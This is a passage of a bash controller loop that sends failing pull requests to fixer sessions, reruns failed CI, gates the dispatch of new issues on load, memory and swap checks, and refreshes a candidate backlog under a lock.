          # PR sat red forever with no worker at all (observed: #8278 had conflict markers committed,
          # #8193 a new MD018 finding; both had zero workers for hours). Route them to the fixer,
          # which now also receives the failing CI log, capped like every other fix loop.
          NFC2="$(cat "$O/state/fixcount-$PR" 2>/dev/null || echo 0)"
          case "$NFC2" in ''|*[!0-9]*) NFC2=0 ;; esac
          if [ "$NFC2" -ge "${MAX_FIX_TRIES:-3}" ]; then
            [ -f "$O/state/parked-$PR" ] || { echo "${HEAD_N:-}" > "$O/state/parked-$PR"; echo "#$PR PARKED (CI still red after $NFC2 fixes: $V)" >>"$LOG"; }
          elif claim_live "$PR" || sess "fix-$PR" || sess "merge-$PR"; then
            : # a worker is already on it
          elif [ "$(tmux ls 2>/dev/null | grep -c '^fix-')" -lt "${MAX_FIX:-3}" ] && can_spawn; then
            printf '%s\n' "$REPO" "$OR" "$PR" "$BR" > "$O/state/argv-$PR"
            if tmux new-session -d -s "fix-$PR" "bash '$O/fix-one.sh' --argv '$O/state/argv-$PR'" 2>/dev/null; then
              echo $((NFC2 + 1)) > "$O/state/fixcount-$PR"
              echo "#$PR CI-red ($V) -> fixer attempt $((NFC2 + 1))" >>"$LOG"
            else
              echo "#$PR CI-red, fixer spawn FAILED" >>"$LOG"
            fi
          fi
        fi
        if echo "$V" | grep -q python-ci-gate; then
          RID="$(gh pr checks "$PR" --repo "$OR" --json name,link --jq '.[]|select(.name=="python-ci-gate")|.link' 2>/dev/null | sed -nE 's#.*/runs/([0-9]+).*#\1#p')"
          if [ -n "${RID:-}" ] && [ ! -f "$O/state/rerun-$PR-$RID" ]; then
            gh run rerun "$RID" --repo "$OR" --failed >>"$LOG" 2>&1 && { touch "$O/state/rerun-$PR-$RID"; echo "#$PR rerun CI" >>"$LOG"; }
          fi
        fi ;;
    esac
  done
  heartbeat

  # ---- 2) capacity-gated dispatch ----------------------------------------
  # prune the backlog of already-dispatched issues (otherwise it reads as non-empty but yields nothing)
  if [ -s "$O/candidates.txt" ]; then
    python3 - "$O/candidates.txt" "$O/dispatched.txt" <<'PY'
import sys
cand=[l.strip() for l in open(sys.argv[1]) if l.strip()]
done=set(l.strip() for l in open(sys.argv[2]) if l.strip())
keep=[x for x in cand if x not in done]
open(sys.argv[1],"w").write("\n".join(keep)+("\n" if keep else ""))
PY
  fi
  L="$(load1)"; LANES="$(tmux ls 2>/dev/null | grep -c '^lane-')"
  # A load reading that is empty or non-numeric is the DOCUMENTED FAIL-OPEN (can_spawn() defaults it
  # to 0). Kept deliberately (#1702): both supported platforms are measurable now, and failing CLOSED
  # on an unreadable probe would convert "no load back-pressure" into a permanent controller outage on
  # a host with no procfs and no sysctl — a worse and less recoverable failure than the gate it guards.
  # The remaining gates (MAX_LANES, memory, merge-priority) still bound dispatch. Coerced here as well
  # so the gate chain cannot emit "integer expression expected", and so the logged value IS the value
  # the gate used.
  is_num "${L:-}" || L=0
  # swap_total=0 => swap uninitialised (fresh boot), NOT pressure — allow. An UNREADABLE probe is
  # UNKNOWN and takes that same allow, for the reason above; unlike 0 it is a distinguishable state
  # (swap_usage_mb returns non-zero), so a future decision to fail closed there has a seam to use.
  SWFREE=9999; SWTOTAL=0
  if _sw="$(swap_usage_mb)"; then SWFREE="${_sw%% *}"; SWTOTAL="${_sw##* }"; fi
  is_num "$SWFREE" || SWFREE=9999
  is_num "$SWTOTAL" || SWTOTAL=0
  # Available memory through the portable helper: /proc/meminfo (MemAvailable, else MemFree+Cached)
  # on a cell; `free`+`inactive` vm_stat pages on macOS. It fails CLOSED (rc != 0 -> UNKNOWN -> do
  # not add work) -- before #1702 the probe was vm_stat-only and therefore failed closed on EVERY
  # Linux cell, which is the false green (cycles complete, nothing ever dispatches) this PR removes.
  if MEMAVAIL_MB="$(mem_avail_mb)"; then
    MEM_UNKNOWN=0
  else
    # The probe itself failed. UNKNOWN, not ample: we cannot see capacity, so we do not add work.
    MEMAVAIL_MB=0; MEM_UNKNOWN=1
  fi
  echo "[cap] load=$L/$MAX_LOAD lanes=$LANES/$MAX_LANES mem_avail=${MEMAVAIL_MB}M/${MIN_MEM_FREE_MB}M swap_free=${SWFREE}M/${MIN_SWAP_FREE}M" >> "$LOG"
  # Four gates. swap_total=0 => swap uninitialised (fresh boot), NOT pressure — allow.
  # Name the binding gate: an earlier version logged "skipped (load=…)" while load was never
  # consulted, so a lanes-bound or swap-bound stall looked like a load stall.
  GATE_WHY="$(mp_reason "${OPEN_N:-0}" "$LANES")"
  if [ -n "$GATE_WHY" ]; then :
  elif [ "$L" -ge "$MAX_LOAD" ]; then GATE_WHY="load=$L>=max_load=$MAX_LOAD"
  elif [ "$LANES" -ge "$MAX_LANES" ]; then GATE_WHY="lanes=$LANES>=max_lanes=$MAX_LANES"
  elif [ "$SWTOTAL" -ne 0 ] && [ "$SWFREE" -le "${MIN_SWAP_FREE:-600}" ]; then GATE_WHY="swap_free=${SWFREE}M<=min_swap_free=${MIN_SWAP_FREE:-600}M"
  # "A failed probe is UNKNOWN, not ample" is only true if MEM_UNKNOWN can be SET, and it is set
  # from mem_avail_mb()'s EXIT STATUS (its awk `exit 1`s on absent fields) rather than from an empty
  # string: awk's END block always ran, so `printf "%d"` yielded 0 for unset fields and a test for
  # an empty MEMAVAIL_MB could never be true. The helper is therefore tested on its own, above.
  elif [ "${MEM_UNKNOWN:-0}" = "1" ]; then GATE_WHY="mem_probe_failed (capacity unknown -> do not add work)"
  elif [ "$MEMAVAIL_MB" -le "$MIN_MEM_FREE_MB" ]; then GATE_WHY="mem_avail=${MEMAVAIL_MB}M<=min_mem_free_mb=${MIN_MEM_FREE_MB}M"
  fi
  if [ -z "$GATE_WHY" ]; then
    : > "$O/.batch"; K=0
    while read -r ISS; do
      [ -z "${ISS:-}" ] && continue
      grep -qx "$ISS" "$O/dispatched.txt" 2>/dev/null && continue
      echo "$ISS" >> "$O/.batch"; echo "$ISS" >> "$O/dispatched.txt"; K=$((K+1)); [ "$K" -ge "$BATCH" ] && break
    done < "$O/candidates.txt"
    if [ -s "$O/.batch" ]; then
      echo "[dispatch] load=$L lanes=$LANES -> $(tr '\n' ' ' < "$O/.batch")" >> "$LOG"
      bash "$O/dispatch-merge.sh" "$REPO" "$OR" $(tr '\n' ' ' < "$O/.batch") >> "$LOG" 2>&1
    else echo "[dispatch] backlog empty" >> "$LOG"; fi
  else
    echo "[dispatch] skipped ($GATE_WHY)" >> "$LOG"
  fi
  heartbeat

  # ---- 3) background backlog refresh (locked, small, non-blocking) --------
  BL="$(wc -l < "$O/candidates.txt" | tr -d ' ')"
  if [ "$BL" -lt 6 ]; then
    if [ ! -d "$O/.refresh.lock" ]; then
      mkdir -p "$O/.refresh.lock"
      echo "[refresh] spawning (backlog=$BL)" >> "$LOG"
      ( bash "$O/refresh-candidates.sh" 6 >> "$LOG" 2>&1; rm -rf "$O/.refresh.lock" ) &
    else
      # stale lock guard (>20 min)
      if [ -n "$(find "$O/.refresh.lock" -mmin +20 2>/dev/null)" ]; then rm -rf "$O/.refresh.lock"; echo "[refresh] cleared stale lock" >> "$LOG"; fi
    fi
  fi

  # `& wait`, not a bare sleep: bash runs a trap only AFTER the current foreground command
  # completes, so `sleep 240` deferred the stop for up to a whole cycle — measured 5.07s of a 6s
  # sleep, vs 0.09s with the background form. The lock is held either way, but "kill -TERM ends
  # the process" (agent-infra#1715's indicator) is then true in ~0.1s, not in four minutes.
  sleep "$CYC" & wait $!
done
